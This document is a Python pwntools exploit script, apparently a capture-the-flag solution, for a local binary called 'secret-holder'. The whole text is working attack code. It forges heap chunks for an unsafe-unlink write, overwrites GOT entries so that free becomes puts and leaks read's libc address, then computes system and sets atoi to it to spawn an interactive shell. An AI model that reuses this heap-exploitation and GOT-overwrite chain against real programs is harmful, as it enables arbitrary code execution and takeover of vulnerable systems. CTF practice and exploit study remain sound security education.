from pwn import *

debug = 1

if debug:
    p = process('./secret-holder')
else:
    pass

size_class = {'small': '1', 'big': '2', 'huge': '3'}

libc = ELF('./libc.so')

small_secret = 0x6020B0
big_secret = 0x6020A0
free_got = 0x602018
puts_plt = 0x4006C0
read_got = 0x602040
atoi_got = 0x602070

system_off = libc.symbols['read'] - libc.symbols['system']

def keep(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("1")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_class[size])
    p.recvuntil("Tell me your secret: \n")
    p.send(size)

def wipe(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_class[size])

def renew(size, content):
    p.recvuntil("3. Renew secret\n")
    p.sendline("3")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_class[size])
    p.recvuntil("Tell me your secret: \n")
    p.send(content)


keep('small')
wipe('small')
keep('big')
wipe('small')
keep('small')
keep('huge')
wipe('huge')
keep('huge')

payload1  = p64(0) + p64(0x21) + p64(small_secret - 0x18) + p64(small_secret - 0x10)
payload1 += p64(0x20) + p64(0x61A90) 
renew('big', payload1)
wipe('huge') 

payload2 = 'a' * 8 + p64(free_got) + 'b' * 8 + p64(big_secret) # padding + big_secret + huge_secret + small_secret
renew('small', payload2)
renew('big', p64(puts_plt))
renew('small', p64(read_got)) # *free_got = puts_plt, *big_secret = read_got

wipe('big')  # puts(read_got)
data = p.recvline()
read_addr = u64(data[:6] + '\x00\x00')
print "read_addr: " + hex(read_addr)
system_addr = read_addr - system_off
print "system_addr: " + hex(system_addr)

payload3 = p64(atoi_got) + 'a'*8 + p64(big_secret) + p64(1) # big_secret + huge_secret + small_secret + big_in_use_flag
renew('small', payload3)
renew('big', p64(system_addr)) #*atoi_got = system_addr

p.recvuntil('3. Renew secret\n')
p.send('sh')

p.interactive()

